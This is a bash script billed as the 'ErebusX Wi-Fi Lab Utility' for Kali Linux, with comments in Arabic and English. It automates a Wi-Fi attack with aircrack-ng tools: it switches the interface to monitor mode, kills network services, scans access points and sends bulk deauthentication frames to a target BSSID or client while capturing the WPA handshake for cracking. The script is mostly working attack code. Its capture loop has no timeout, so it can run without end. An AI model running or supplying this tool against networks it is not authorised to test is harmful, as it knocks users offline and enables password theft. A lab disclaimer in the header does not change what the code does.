#!/usr/bin/env bash
# SPDX-License-Identifier: Apache-2.0
#
# =====================================================================
#  ErebusX Wi-Fi Lab Utility  —  أداة مختبر الواي فاي من ErebusX
#  Version: 1.0.0    Build: 2025-08-29
#  Author/المؤلف: ErebusX   |   GitHub: https://github.com/ErebusX1
#  Copyright © 2025 ErebusX. All rights reserved.
#
#  EN: Helper for Wi-Fi lab work on Kali: prep/scan/attack/restore,
#      auto-retries, logging, and handshake capture. Use ONLY on
#      networks you own or have explicit written permission to test.
#  AR: أداة للعمل المخبري على كالي: تجهيز/فحص/هجوم/استرجاع، مع
#      إعادة محاولات وسجلات والتقاط الـ Handshake. استخدمها فقط
#      على شبكتك أو بإذن قانوني صريح وخطي.
#
#  License (EN): Apache-2.0. You may use/modify/redistribute provided
#      this header and NOTICE remain intact. See LICENSE and NOTICE.
#  الترخيص (AR): Apache-2.0. يحق لك الاستخدام/التعديل/إعادة النشر
#      بشرط الإبقاء على هذه الترويسة وملف NOTICE كما هما. راجع LICENSE.
#
#  Attribution / نسب العمل:
#    EN: Keep the “ErebusX Wi-Fi Lab Utility” name and the GitHub link
#        visible in any copy or fork; do not remove or obfuscate them.
#    AR: يجب الإبقاء على اسم الأداة ورابط GitHub ظاهرين في أي نسخة
#        أو تفرّع؛ يُمنع حذفهما أو إخفاؤهما.
#
#  Warranty / الضمان:
#    EN: Provided “AS IS”, without any warranties or liability.
#    AR: يقدّم “كما هو” بدون أي ضمانات أو مسؤولية.
#
#  Quick usage / الاستخدام السريع:
#    sudo $0 prep <iface> <ch>
#    sudo $0 scan <iface> [seconds]
#    sudo $0 attack <iface> <ch> <bssid> [all|STA_MAC] [count]
#    sudo $0 restore <iface>
#    sudo $0 status <iface>
#    sudo $0 restart <iface>
# =====================================================================

set -u

# ---------- أسماء ومسارات ----------
SCRIPT_NAME="ErebusX"
LOG_ROOT="${HOME}/wifi_logs"
HS_ROOT="${HOME}/handshakes"
TIMESTAMP="$(date +%F_%H-%M-%S)"

# ---------- ألوان ----------
CG="\e[92m"; CY="\e[93m"; CR="\e[91m"; CB="\e[94m"; C0="\e[0m"

banner_scare3() {
  local R='\e[1;31m' N='\e[0m' TEXT="E r e b u s X"
  if command -v figlet >/dev/null 2>&1; then
    printf "%b" "$R"
    figlet -f doom -c -w "$(tput cols 2>/dev/null || echo 120)" "$TEXT" || \
    figlet -f standard -c -w "$(tput cols 2>/dev/null || echo 120)" "$TEXT"
    printf "%b" "$N"
  else
    printf "%b%s%b\n" "$R" "!! E r e b u s X !!" "$N"
  fi
}


# ---------- إعدادات افتراضية ----------
RETRIES_MODE="${RETRIES_MODE:-8}"    # محاولات لضبط Monitor+Channel
RETRIES_RUN="${RETRIES_RUN:-6}"      # محاولات لإعادة تشغيل أوامر طويلة
SLEEP_MODE="${SLEEP_MODE:-2}"        # ثانية بين محاولات ضبط المود
SLEEP_RUN="${SLEEP_RUN:-3}"          # ثانية بين محاولات إعادة التشغيل
DEA_COUNT_DEFAULT="${DEA_COUNT_DEFAULT:-96}"  # عدد إطارات deauth لكل دفعة
SCAN_SECONDS="${SCAN_SECONDS:-15}"           # مدة فحص الشبكات

mkdir -p "$LOG_ROOT" "$HS_ROOT"

# ---------- أدوات طباعة ----------
log()  { echo -e "${CB}[${SCRIPT_NAME}]${C0} $*"; }
ok()   { echo -e "${CG}[OK]${C0} $*"; }
warn() { echo -e "${CY}[WARN]${C0} $*"; }
err()  { echo -e "${CR}[ERR]${C0} $*" >&2; }

need_root() {
  if [[ $EUID -ne 0 ]]; then
    err "مطلوب صلاحيات root. شغّل هكذا: sudo $SCRIPT_NAME $*"
    exit 1
  fi
}

have() { command -v "$1" >/dev/null 2>&1; }

require_tools() {
  local miss=()
  for t in ip iwconfig airmon-ng airodump-ng aireplay-ng aircrack-ng nmcli rfkill awk sed grep; do
    have "$t" || miss+=("$t")
  done
  ((${#miss[@]})) && { err "أدوات ناقصة: ${miss[*]}"; exit 1; }
}

iface_ok() {
  local ifc="$1"
  ip link show "$ifc" &>/dev/null || { err "الواجهة $ifc غير موجودة."; exit 1; }
}

# ---------- NetworkManager ----------
nm_stop() {
  if systemctl is-active --quiet NetworkManager; then
    log "إيقاف NetworkManager وتعطيل Wi-Fi…"
    nmcli radio all off || true
    systemctl stop NetworkManager || true
  fi
}
nm_start() {
  log "تشغيل NetworkManager وفتح Wi-Fi…"
  systemctl unmask NetworkManager 2>/dev/null || true
  systemctl enable NetworkManager 2>/dev/null || true
  systemctl start NetworkManager || true
  nmcli radio all on || true
}

kill_conflicts() {
  log "قتل العمليات المتعارضة (wpa_supplicant/NetworkManager/…)"
  airmon-ng check kill >/dev/null 2>&1 || true
  pkill -9 wpa_supplicant >/dev/null 2>&1 || true
}

# ---------- أوضاع العمل ----------
set_managed() {
  local ifc="$1"
  ip link set "$ifc" down || true
  iwconfig "$ifc" mode managed || true
  ip link set "$ifc" up || true
}

ensure_monitor() {
  local ifc="$1" ch="$2"
  local i=1
  while (( i <= RETRIES_MODE )); do
    ip link set "$ifc" down || true
    iwconfig "$ifc" mode monitor && iwconfig "$ifc" channel "$ch" && ip link set "$ifc" up
    sleep "$SLEEP_MODE"
    if iwconfig "$ifc" 2>/dev/null | grep -qi "Mode:Monitor" && \
       iwconfig "$ifc" 2>/dev/null | grep -q  "Frequency"; then
      ok "تم ضبط $ifc على Monitor والقناة ch=$ch."
      return 0
    fi
    warn "فشل ضبط monitor… المحاولة ${i}/${RETRIES_MODE}"
    ((i++))
  done
  err "تعذّر ضبط monitor على $ifc (تحقّق من rfkill/الدرايفر)."
  return 1
}

# ---------- مجلدات إخراج ----------
mk_outdir() {
  local tag="$1"
  local dir="${HS_ROOT}/${tag}_${TIMESTAMP}"
  mkdir -p "$dir"
  echo "$dir"
}

# ---------- فحص CSV المختصر ----------
print_csv_brief() {
  local csv="$1"
  echo -e "${CG}BSSID, CH, PWR, ENC, CIPHER, AUTH, ESSID${C0}"
  awk -F',' 'BEGIN{OFS=","} /WPA|OPN|WEP/ {
    gsub(/^ +| +$/, "", $1);  gsub(/^ +| +$/, "", $4);
    gsub(/^ +| +$/, "", $6);  gsub(/^ +| +$/, "", $8);
    gsub(/^ +| +$/, "", $NF);
    printf "%s, %s, %s, %s, %s, %s, %s\n", $1,$4,$6,$8,$9,$10,$14
  }' "$csv" | sed 's/^/  /'
}

# ---------- أوامر رئيسية ----------
prep() {
  need_root "$0"; require_tools
  local ifc="$1" ch="$2"
  iface_ok "$ifc"
  echo -e "${CB}Disconnect any active links (إن وُجدت)…${C0}"
  nm_stop
  kill_conflicts
  rfkill unblock all || true
  ensure_monitor "$ifc" "$ch" || exit 1
  ok "READY ➜ $ifc على MONITOR والقناة ch=$ch (الإنترنت OFF)."
  ip link show "$ifc" | sed 's/^/  /'; iwconfig "$ifc" | sed 's/^/  /'
}

scan() {
  need_root "$0"; require_tools
  local ifc="$1" secs="${2:-$SCAN_SECONDS}"
  log "فحص سريع ${secs}s… اضغط Ctrl+C للإيقاف."
  local tmp="${LOG_ROOT}/scan_${TIMESTAMP}"
  airodump-ng "$ifc" --write-interval 1 --output-format csv -w "$tmp" &
  local pid=$!; sleep "$secs" || true; kill "$pid" 2>/dev/null || true; sleep 1
  local csv="${tmp}-01.csv"
  [[ -f "$csv" ]] || { err "لا يوجد CSV من الفحص."; return 1; }
  print_csv_brief "$csv"
  echo -e "\n${CY}انسخ BSSID والقناة لاستخدامهما في attack.${C0}"
}

attack() {  # usage: attack <iface> <ch> <bssid> [all|STA_MAC] [count]
  need_root "$0"; require_tools
  banner_scare3
  local ifc="$1" ch="$2" bssid="$3" target="${4:-all}" count="${5:-$DEA_COUNT_DEFAULT}"
  iface_ok "$ifc"

  nm_stop; kill_conflicts; rfkill unblock all || true
  ensure_monitor "$ifc" "$ch" || exit 1

  # إخراج
  local tag="handshake"
  local outdir; outdir="$(mk_outdir "$tag")"
  local cap_base="$outdir/cap"
  local log_dump="$outdir/airodump.log"
  local log_deauth="$outdir/aireplay.log"

  log "بدء الالتقاط (airodump) إلى: ${cap_base}-01.cap"
  airodump-ng -c "$ch" --bssid "$bssid" -w "$cap_base" "$ifc" >>"$log_dump" 2>&1 &
  local dump_pid=$!
  sleep 2

  # تحضير أمر deauth
  local cmd=(aireplay-ng --ignore-negative-one --deauth "$count" -a "$bssid")
  if [[ "$target" == "all" || "$target" == "broadcast" ]]; then
    cmd+=("$ifc")
  else
    cmd+=(-c "$target" "$ifc")
  fi

  log "إرسال DeAuth ($count) ➜ target: ${target}"
  "${cmd[@]}" >>"$log_deauth" 2>&1 &

  # مراقبة الـ handshake حتى يلتقط أو ينتهي الوقت
  local cap_file="${cap_base}-01.cap"
  local max_wait=0
  local waited=0
  local found=0

  while true; do
    sleep 3; (( waited += 3 ))
    if [[ -s "$cap_file" ]]; then
      if aircrack-ng -a2 -w /dev/null "$cap_file" 2>/dev/null | grep -qi "handshake"; then
        found=1; break
      fi
    fi
  done

  # تنظيف
  pkill -9 aireplay-ng 2>/dev/null || true
  kill "$dump_pid" 2>/dev/null || true
  pkill -9 airodump-ng 2>/dev/null || true

  if (( found )); then
    ok "تم التقاط WPA Handshake لـ $bssid 🎉"
    ok "المسار: $cap_file"
  else
    warn "لم يتم رصد Handshake خلال ${max_wait}s — جرّب زيادة العدد/استهداف STA محدد."
    warn "سجلات: $log_dump , $log_deauth"
  fi
}

restore() {
  need_root "$0"; require_tools
  local ifc="$1"; iface_ok "$ifc"
  log "إيقاف أي عمليات خلفية…"; pkill -9 aireplay-ng 2>/dev/null || true; pkill -9 airodump-ng 2>/dev/null || true
  log "إرجاع $ifc إلى Managed وتشغيل الإنترنت…"
  set_managed "$ifc"; rfkill unblock all || true; nm_start
  ok "تمت الاستعادة."; nmcli device status || true
}

status() {
  local ifc="$1"
  echo "— ip link show $ifc"; ip link show "$ifc" | sed 's/^/  /'
  echo "— iwconfig $ifc"; iwconfig "$ifc" | sed 's/^/  /'
  echo "— nmcli device status"; nmcli device status || true
}

help_msg() {
  banner_scare3
  cat <<EOF
${SCRIPT_NAME} — أدوات مختبر الواي فاي (Kali)

الاستخدام:
  sudo $0 prep <iface> <channel>              # تجهيز الواجهة Monitor + تثبيت القناة
  sudo $0 scan <iface> [seconds]              # فحص سريع وإخراج CSV مختصر
  sudo $0 attack <iface> <ch> <bssid> [all|STA_MAC] [count]   # التقاط + DeAuth تلقائي
  sudo $0 restore <iface>                     # إرجاع الوضع الطبيعي
  sudo $0 status <iface>                      # حالة الواجهة

متغيرات اختيارية قبل الأمر:
  RETRIES_MODE / RETRIES_RUN / SLEEP_MODE / SLEEP_RUN / DEA_COUNT_DEFAULT / SCAN_SECONDS
EOF
}

restart() {
  need_root "$0"; require_tools
  local ifc="$1"

  log "إيقاف أي عمليات خلفية (aireplay/airodump)…"
  pkill -9 aireplay-ng 2>/dev/null || true
  pkill -9 airodump-ng 2>/dev/null || true

  log "إعادة تشغيل الدرايفر والإنترنت على $ifc بدون تغيير Tx-Power…"
  ip link set "$ifc" down || true
  sleep 1
  ip link set "$ifc" up || true

  nm_start
  ok "تمت إعادة تشغيل $ifc والإنترنت رجعت طبيعية."
}

# ---------- Dispatcher ----------

case "${1:-}" in
  restart)
    shift; [[ $# -ge 1 ]] || { help_msg; exit 1; }
    restart "$@"
    ;;
  # باقي الأوامر (prep / scan / attack / restore / status ...)

  prep)     shift; [[ $# -ge 2 ]] || { help_msg; exit 1; }; prep "$@";;
  scan)     shift; [[ $# -ge 1 ]] || { help_msg; exit 1; }; scan "$@";;
  attack)   shift; [[ $# -ge 3 ]] || { help_msg; exit 1; }; attack "$@";;
  restore)  shift; [[ $# -ge 1 ]] || { help_msg; exit 1; }; restore "$@";;
  status)   shift; [[ $# -ge 1 ]] || { help_msg; exit 1; }; status "$@";;
  -h|--help|"") help_msg;;
  *) err "أمر غير معروف: $1"; help_msg; exit 1;;
esac
